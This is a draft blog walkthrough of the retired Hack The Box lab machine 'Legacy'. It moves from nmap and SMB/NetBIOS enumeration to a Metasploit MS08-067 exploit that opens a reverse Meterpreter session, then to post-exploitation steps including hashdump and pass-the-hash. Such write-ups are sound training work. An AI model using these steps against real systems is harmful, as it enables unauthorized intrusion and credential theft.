I"]-<p><em>some of this post is still being edited. Posting draft early by request.</em></p>

<p>The Legacy HTB machine was one of the first HTB machines I ever broke into. It’s a retired box that is pretty basic, leaning towards understanding basic methodology and how to make use of CVEs that you find on a box. It’s a good start for practicing for the OSCP.</p>

<p><img src="/assets/img/Walkthroughs/Legacy/Website_shot.png" alt="Website Screenshot" /></p>

<p>If this writeup isn’t enough, HTB does include <a href="https://www.hackthebox.eu/home/machines/profile/2">a writeup</a> on the site. There are also plenty of videos online how to do this box as well.</p>

<p><strong>Okay let’s get into it</strong></p>

<h3 id="scanning-the-machine">Scanning the machine</h3>
<p>So from HTB we already know the IP address is <code>10.10.10.4</code> so as long as our openvpn connection is setup we should be able to start banging on it.</p>

<p>I’m going to scan this in a few different ways. First let’s do a basic nmap.</p>

<h4 id="basic-nmap">Basic nmap</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap 10.10.10.4
</code></pre></div></div>
<p>or in case it has trouble</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -Pn 10.10.10.4
</code></pre></div></div>

<p><img src="/assets/img/Walkthroughs/Legacy/basic_nmap.png" alt="Basic nmap scan" /></p>

<p>This scan will give us some basic information. It’s good to do this scan first to see if there are any ports you can start to enumearte while waiting for larger scans.<br />
From this we can guess it might have something to do with SMB. How?<br />
<strong>SMB</strong></p>
<ul class="task-list">
  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Has older SMB port 139. SMB used to run on 139 on top of netbios</li>
  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Has newer SMB port 445. After Windows 2000, SMB was moved to this port.<br />
It’s not enough for full confidence but it’s enough to start to see where we might be going with this.</li>
</ul>

<p>Let’s run a couple bigger scans.</p>

<p><strong>Note:</strong> The next two scans can be run back to back but if you run the nmapAutomator.sh script, it includes the nmap scan I’m about to show you.</p>

<h4 id="big-nmap-scan">“Big nmap” scan</h4>
<p>I personally call this the big nmap. It’s a scan that will scan all ports, and run anything it can against it.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -T4 -A -p- 10.10.10.4
</code></pre></div></div>
<p>I kept <code>-Pn</code> just because.</p>

<p><img src="/assets/img/Walkthroughs/Legacy/big_nmap.png" alt="big nmap " /></p>

<p>Before we run the next scan, lets go ahead and see what we can find from this.</p>
<ul>
  <li>Still looks like SMB</li>
  <li>SMB Security looks weak - <code>message_signing: disabled</code></li>
  <li>Evidence that it is an older Windows machine, most likley XP.</li>
  <li>Computer name is ‘Legacy’</li>
  <li>Workgroup is ‘HTB’</li>
  <li>Maybe possible to enumerate netbios</li>
  <li>Has directory services enabled</li>
</ul>

<p>Okay let’s run the nmapAutomator.sh scan.</p>

<h4 id="nmapautomatorsh">nmapAutomator.sh</h4>
<p>Before we run this scan, let’s talk about it a bit.<br />
nmapAutomator.sh is a bash script written by Github users <strong>21y4d, austinsonger, and Knowledge_Wisdom_Understanding</strong> and can be found on <a href="https://github.com/21y4d/nmapAutomator">Github here.</a></p>

<p>It will run a handful of scans at the same time for you including:</p>
<ul>
  <li>sslscan</li>
  <li>nikto</li>
  <li>wpscan</li>
  <li>smbmap</li>
  <li>etc.</li>
</ul>

<p>So let’s run a full scan and see how it goes.<br />
The scan is quite lengthy so I won’t be posting a screenshot of the whole thing, but if you want to see the whole scan, you can watch it here. <a href="https://asciinema.org/a/MnWeg5pekvWqu44AWeiSqOO9v"><img src="https://asciinema.org/a/MnWeg5pekvWqu44AWeiSqOO9v.svg" alt="asciicast" /></a></p>

<p>This scan basically just confirmed what we found from previous scans. But it did give some paticularly interesting information on the SMB situation.
<img src="/assets/img/Walkthroughs/Legacy/nmapauto_vulns.png" alt="SMB Vulnerabilities" /></p>

<p>So now we know that this machine has two CVEs marked as vulnerable.</p>
<ul>
  <li>CVE-2008-4250</li>
  <li>CVE-2017-0143</li>
</ul>

<p>At this point we could probably start poking at these CVEs but let’s try to dig in a bit further before attacking the machine.</p>

<h4 id="netbios-enumeration">Netbios enumeration</h4>
<p>So with netbios there are a couple ways we can enumerate it. The first way is to run <code>nbtscan</code> on it to see what services we can see. We are looking for information about it being connected to a domain or a some sort of file server service.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nbtscan -vh 10.10.10.4
</code></pre></div></div>
<p>After running this we see that it in fact has a file server service running as well as a few others listed. This is good information for us.</p>

<p><img src="/assets/img/Walkthroughs/Legacy/nbtscan.png" alt="Nbtscan" /></p>

<h4 id="smb-enumeration">SMB enumeration</h4>
<p>Okay so when we ran our big nmap scan we got plenty of information on SMB but let’s just run some SMB specific enumerations real fast just for the heck of it. Let’s start with smbclient.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient -L \\\\10.10.10.4\\\
smbclient -N -L \\\10.10.10.4\\

</code></pre></div></div>
<p>smbclient is a small application similar to FTP. It may allow you to view files from the server. It also allows to put files on the server, view files, etc. In some cases you will be able to log in anonymously.</p>

<p><img src="/assets/img/Walkthroughs/Legacy/smbclient.png" alt="smbclient" /></p>

<p>We aren’t getting much from it right now and that’s okay. Let’s keep poking around.</p>

<p><em>Note: smbmap is also a great tool for enumearting SMB, in paticular when working with Active Directory or domains.</em></p>

<p>Another way to enumerate SMB is to use nmap with the SMB script. We have already done this in the big nmap scan we did previously, but if you wanted to run it again it would look like this.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -p 445 --script smb-os-discovery 10.10.10.4
</code></pre></div></div>

<h4 id="cve-2008-4250">CVE-2008-4250</h4>
<h4 id="cve-2017-0143">CVE-2017-0143</h4>
<h4 id="exploitation-and-gaining-access">Exploitation and Gaining Access</h4>

<p>metasploit scanning enum</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>search for smb enum
use auxiliary/scanner/smb/smb_version

msf5 &gt; use auxiliary/scanner/smb/smb_version
msf5 auxiliary(scanner/smb/smb_version) &gt; options

Module options (auxiliary/scanner/smb/smb_version):

Name       Current Setting  Required  Description
----       ---------------  --------  -----------
RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
SMBDomain  .                no        The Windows domain to use for authentication
SMBPass                     no        The password for the specified username
SMBUser                     no        The username to authenticate as
THREADS    1                yes       The number of concurrent threads (max one per host)

msf5 auxiliary(scanner/smb/smb_version) &gt; set RHOSTS
[-] Unknown variable
Usage: set [option] [value]

Set the given option to value.  If value is omitted, print the current value.
If both are omitted, print options that are currently set.

If run from a module context, this will set the value in the module's
datastore.  Use -g to operate on the global datastore.

If setting a PAYLOAD, this command can take an index from `show payloads'.

msf5 auxiliary(scanner/smb/smb_version) &gt; set RHOSTS 10.10.10.4
RHOSTS =&gt; 10.10.10.4
msf5 auxiliary(scanner/smb/smb_version) &gt; run

[+] 10.10.10.4:445        - Host is running Windows XP SP3 (language:English) (name:LEGACY) (workgroup:HTB ) (signatures:optional)
[*] 10.10.10.4:445        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre></div></div>

<p>Find version and look for exploits online.</p>

<p>Doesn’t find much. Hope that Old OS just have vulns</p>

<p>Search google for exploits.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ms08-067 - SMB Windows XP service pack 3 vuln. 
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 auxiliary(scanner/smb/smb_version) &gt; use exploit/windows/smb/ms08_067_netapi
msf5 exploit(windows/smb/ms08_067_netapi) &gt; options

Module options (exploit/windows/smb/ms08_067_netapi):

Name     Current Setting  Required  Description
----     ---------------  --------  -----------
RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
RPORT    445              yes       The SMB service port (TCP)
SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

Exploit target:

Id  Name
--  ----
0   Automatic Targeting

msf5 exploit(windows/smb/ms08_067_netapi) &gt; rhosts 10.10.10.4
[-] Unknown command: rhosts.
msf5 exploit(windows/smb/ms08_067_netapi) &gt; set rhosts 10.10.10.4
rhosts =&gt; 10.10.10.4
msf5 exploit(windows/smb/ms08_067_netapi) &gt; run

[*] Started reverse TCP handler on 10.10.14.17:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (176195 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.17:4444 -&gt; 10.10.10.4:1031) at 2020-05-11 23:01:23 -0400

meterpreter &gt;
</code></pre></div></div>

<p>You can also use the PoC script and modify it to work and use that manually.</p>

<h3 id="post-exploit">post exploit</h3>

<p>check user. and system info (these are meterpreter commands)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getuid
then
sysinfo
</code></pre></div></div>

<p>you can do a hashdump to get the usernames and passwords for cracking later</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashdump
</code></pre></div></div>

<p>you can do pass the hash stuff as well.</p>

<p>you can navigate the machine with</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shell
</code></pre></div></div>

<p>Get the user and root.txt files</p>

<p>to cat out a file you use</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>type filename.txt
</code></pre></div></div>
:ET